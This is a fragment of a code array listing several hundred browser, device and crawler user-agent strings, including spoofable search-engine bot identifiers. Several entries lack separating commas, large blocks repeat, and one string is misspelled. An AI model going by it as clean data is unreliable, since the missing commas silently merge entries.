"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)"
"AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",
"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",
"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",
"msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
"msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)",
"NetResearchServer/4.0(loopimprovements.com/robot.html)",
"NetResearchServer/3.5(loopimprovements.com/robot.html)",
"NetResearchServer/2.8(loopimprovements.com/robot.html)",
"NetResearchServer/2.7(loopimprovements.com/robot.html)",
"NetResearchServer/2.5(loopimprovements.com/robot.html)",
"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
"Opera/9.20 (Windows NT 6.0; U; en)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"wii libnup/1.0",
"PSP (PlayStation Portable); 2.00",
"Bunjalloo/0.7.6(Nintendo DS;U;en)",
"Doris/1.15 [en] (Symbian)",
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"wii libnup/1.0",
"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
"PSP (PlayStation Portable); 2.00",
"Gigabot/3.0 (http://www.gigablast.com/spider.html)",
"Bunjalloo/0.7.6(Nintendo DS;U;en)",
"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0",
"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+",
"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+",
"Doris/1.15 [en] (Symbian)",
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
